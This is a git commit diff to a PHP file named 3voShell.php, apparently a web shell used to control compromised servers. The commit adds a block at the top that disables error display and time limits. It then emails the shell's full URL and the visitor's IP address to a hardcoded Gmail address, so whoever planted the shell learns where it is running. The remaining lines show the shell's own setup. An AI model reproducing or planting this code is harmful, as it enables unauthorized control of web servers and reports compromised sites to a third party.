036e43ebbc63d8b18dd43d867ed1495e687db5a6
alxwahid <34950902+alxwahid@users.noreply.github.com>
2019-04-12 23:58:46 +0800

    Update 3voShell.php

--- 3voShell.php
+++ 3voShell.php
@@ -1,4 +1,15 @@
 <?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'illangsailor@gmail.com, illangsailor@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php
 error_reporting(0);
 $slf = $_SERVER['PHP_SELF'];
 @session_start();
